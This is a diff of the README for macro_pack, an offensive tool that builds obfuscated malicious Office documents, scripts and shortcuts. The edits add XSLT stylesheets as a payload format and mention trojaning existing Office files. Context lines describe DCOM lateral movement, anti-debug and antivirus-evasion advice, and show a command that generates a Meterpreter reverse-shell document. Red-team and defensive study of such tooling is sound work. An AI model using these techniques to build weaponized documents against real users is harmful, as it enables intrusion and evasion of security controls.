@@ -42,7 +42,7 @@ Note that the main goal of macro\_pack obfuscation is not to prevent reverse eng
 Macro Pack can generate several kind of MS office documents and scripts formats.
 The format will be automatically guessed depending on the given file extension.
 File generation is done using the option --generate or -G.  
-Macro Pack pro version also allow to trojan existing files with option --trojan or -T
+Macro Pack pro version also allow to trojan existing Office files with option --trojan or -T
 
 Ms Office Supported formats are:
 * MS Word 97 (.doc)
@@ -60,6 +60,7 @@ Scripting (txt) supported formats are:
 * Windows Script File (.wsf)
 * Windows Script Components scriptlets (.wsc, .sct)
 * HTML Applications (.hta)
+* XSLT Stylesheet (.xsl) (Yes MS XSLT contains scripts ^^)
 
 Shortcuts supported formats are:
 * Shell Link (.lnk)
@@ -89,7 +90,7 @@ The pro mode includes features such as:
 * Lateral movement using DCOM objects
 * Anti-debug using http://seclists.org/fulldisclosure/2017/Mar/90
 
-For now I do not plan to release or sell this pro version however if you are really interested I can share pro binary in the next case:
+For now I do not plan to release or sell this pro version however if you are really interested I can share code in the next case:
 * You significantly contribute to macro\_pack on GitHub + I need to know your identity
 
 
@@ -310,7 +311,7 @@ echo 192.168.0.5 4444 | macro_pack.exe -t METERPRETER -o -G "\\192.168.0.8\c$\us
     -G, --generate=OUTPUT_FILE_PATH. Generates a file. Will guess the format based on extension.
         Supported Ms Office extensions are: doc, docm, docx, xls, xlsm, xslx, pptm, vsd, vsdm, mpp.
         Note: Ms Office file generation requires Windows OS with right MS Office application installed.
-        Supported Visual Basic scripts extensions are: vba, vbs, wsf, wsc, sct, hta.
+        Supported Visual Basic scripts extensions are: vba, vbs, wsf, wsc, sct, hta, xsl.
         Supported shortcuts extensions are: scf, url, glk
     
     -e, --embed=EMBEDDED_FILE_PATH Will embed the given file in the body of the generated document.
@@ -482,7 +483,8 @@ If you have an issue with macro\_pack AV detection you can write to us for advic
 
 ## Relevant resources
 
-Blog posts about MS Office & retro stuff security:
+Blog posts about hacking with MS Office, VBS,  and other retro stuff security:
+ - https://subt0x11.blogspot.fr/2018/04/wmicexe-whitelisting-bypass-hacking.html
  - http://blog.sevagas.com/?My-VBA-Bot (write a full VBA RAT, includes how to bypass VBOM protection)
  - http://blog.sevagas.com/?Hacking-around-HTA-files  (run hta code in non-hta files and hta polyglots)
  - http://pwndizzle.blogspot.fr/2017/03/office-document-macros-ole-actions-dde.html
@@ -500,7 +502,7 @@ Blog posts about MS Office & retro stuff security:
  - https://www.metasploit.com/
  - https://github.com/Cn33liz/MacroMeter
  - https://github.com/khr0x40sh/MacroShop
- 
+ - https://docs.microsoft.com/en-us/dotnet/standard/data/xml/xslt-stylesheet-scripting-using-msxsl-script
 
 ## Contact
 
